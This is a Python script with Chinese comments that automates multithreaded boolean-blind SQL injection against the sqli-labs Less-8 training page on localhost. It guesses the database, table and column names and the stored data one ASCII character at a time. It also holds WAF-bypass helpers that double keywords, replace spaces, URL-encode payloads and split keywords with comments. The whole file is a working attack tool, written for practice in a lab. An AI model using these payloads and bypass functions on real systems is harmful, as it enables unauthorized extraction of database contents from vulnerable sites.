import requests
import threading
import re
from urllib.parse import quote #导入url编码函数

"""
MySQL 布尔盲注核心思想：
万变不离其宗，本质就是 逐位比较ASCII码 进行爆破。
通过构造 payload 猜解每一个字符，服务器仅返回 True/False,
最终暴力枚举得到：数据库名 → 表名 → 列名 → 数据。
"""
url= "http://127.0.0.1/sqli-labs-master/Less-8/"
#请求头抓包复制粘贴到此处
burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Chromium\";v=\"146\", \"Not;A=Brand\";v=\"24\", \"Google Chrome\";v=\"146\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "en-US;q=0.9,en;q=0.8", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate, br", "Connection": "close"}

#定义全局变量 定义子线程列表
database=[""]*100
threads=[]
tablesname=[""]*100
threadss=[]
columnnames=[""]*100
threadsss=[]
zhiduan=[""]*100
threadssss=[]

#waf双写绕过
def wafdouble(word,payload):                                                    # keyword[:中间] → 单词的前一半 keyword[中间:] → 单词的后一半
    return payload.replace(word,word[:len(word)//2]+word+word[len(word)//2:])   #字符串.replace("被替换的内容"，“替换上去的内容)  
#空格绕过                                                                                          
def wafkongge1(payload):
    return payload.replace(" ","\n")
def wafkongge2(payload):
    return payload.replace(" ","\b")
def wafkongge3(payload):
    return payload.replace(" ","/**/")

#url编码绕过
def wafurlencode(payload):
    return quote(payload)
# 关键字用/**/包裹注释绕过（union→un/**/ion）
def wafzhushi1(word,payload):
    return payload.replace(word,f"/**/{word}/**/")
# 关键字用/**/拆分绕过
def wafzhushi2(word,payload):
    return payload.replace(word,word[:len(word)//2]+"/**/"+word[len(word)//2:])
# 末尾注释符绕过
def wafmowei(payload):
    return payload.replace("#","--+")



#判断是否返回正确页面
def is_true(payload):
    #payload=wafkongge1(payload)
    params = {"id": payload}
    try:
        resp=requests.get(url,params=params,headers=burp0_headers)
        if "You are in" in resp.text:
            return  True
        else:
            return False          #如果返回的内容不为You are in 进入不到except，报错才可以
    except:      
        return False

#数据库名长度   
def datalength():
    for i in range (1,50):
        payload= (f"-1' or length(database())={i}#")            #自行修改payload适应
        if is_true(payload):
            print("数据库名长度为",i)
            return i
            break
        else:
            print(i)

#数据库名
def dataname(i):
    global database
    for j in range(32,127):
        payload=(f"-1' or ascii(substr(database(),{i},1))={j}#")
        if is_true(payload):
            database[i-1]=chr(j)
            print(chr(j))
            break
        else:
            pass

#表名长度
def tablelength(str):
    for i in range (1,50):
        payload= (f"-1' or length((select table_name from information_schema.tables where table_schema='{str}' limit 0,1))={i}#")
        if is_true(payload):
            print("表名长度为",i)
            return i
            break
        else:
            print(i)

#表名
def tablename(str,i):
    global tablesname
    for j in range(32,127):
        payload=(f"-1' or ascii(substr((select table_name from information_schema.tables where table_schema='{str}' limit 0,1),{i},1))={j}#")
        if is_true(payload):
            tablesname[i-1]=chr(j)
            print(chr(j))
            break
        else:
            pass

#列名长度
def columnlength(str,strr):
    for i in range (1,50):
        payload= (f"-1' or length((select column_name from information_schema.columns where table_schema='{str}' and table_name='{strr}' limit 0,1))={i}#")
        if is_true(payload):
            print("列名长度为",i)
            return i
            break
        else:
            print(i)

#列名
def columnname(str,strr,i):
    global columnnames
    for j in range(32,127):
        payload=(f"-1' or ascii(substr((select column_name from information_schema.columns where table_schema='{str}' and table_name='{strr}' limit 0,1),{i},1))={j}#")
        if is_true(payload):
            columnnames[i-1]=chr(j)
            print(chr(j))
            break
        else:
            pass

#字段数据长度
def zhiduanlength(str,strr,strrr):
    for i in range (1,50):
        payload= (f"-1' or length((select {strrr} from {str}.{strr} limit 0,1))={i}#")
        if is_true(payload):
            print("字段名长度为",i)
            return i
            break
        else:
            print(i)

#字段数据内容
def zhiduanname(str,strr,strrr,i):
    global zhiduan
    for j in range(32,127):
        payload=(f"-1' or ascii(substr((select {strrr} from {str}.{strr} limit 0,1),{i},1))={j}#")
        if is_true(payload):
            zhiduan[i-1]=chr(j)
            print(chr(j))
            break
        else:
            pass

#主函数 多线程执行入口
if __name__ == "__main__":
    
    #获取数据库长度并爆破数据库名
    length=datalength()
    for i in range(1,length+1):
        nmappro= threading.Thread(target=dataname,args=(i,))#元组一定要加逗号
        threads.append(nmappro)
        nmappro.start()
    for nmappro in threads:
        nmappro.join()
    
    #拼接数据库名并输出
    databasee= "".join(database)
    print("数据库名为",databasee)

    #获取表长度并爆破表名
    times=tablelength(databasee)
    for i in range(1,times+1):
        t=threading.Thread(target=tablename,args=(databasee,i))
        threadss.append(t)
        t.start()
    for t in threadss:
        t.join()

    #拼接表名并输出
    tablesname="".join(tablesname)
    print("表名为",tablesname)

    #获取列长度并爆破列名
    timess=columnlength(databasee,tablesname)
    for i in range(1,timess+1):
        tt=threading.Thread(target=columnname,args=(databasee,tablesname,i))
        threadsss.append(tt)
        tt.start()
    for tt in threadsss:
        tt.join()

    #拼接列名并输出
    columnnames="".join(columnnames)
    print("列名为",columnnames)

    #获取数据长度并爆破数据
    timesss=zhiduanlength(databasee,tablesname,columnnames)
    for i in range(1,timesss+1):
        ttt=threading.Thread(target=zhiduanname,args=(databasee,tablesname,columnnames,i))
        threadssss.append(ttt)
        ttt.start()
    for ttt in threadssss:
        ttt.join()

    #拼接数据并输出
    zhiduan="".join(zhiduan)
    print("数据为",zhiduan)
    print("完成")










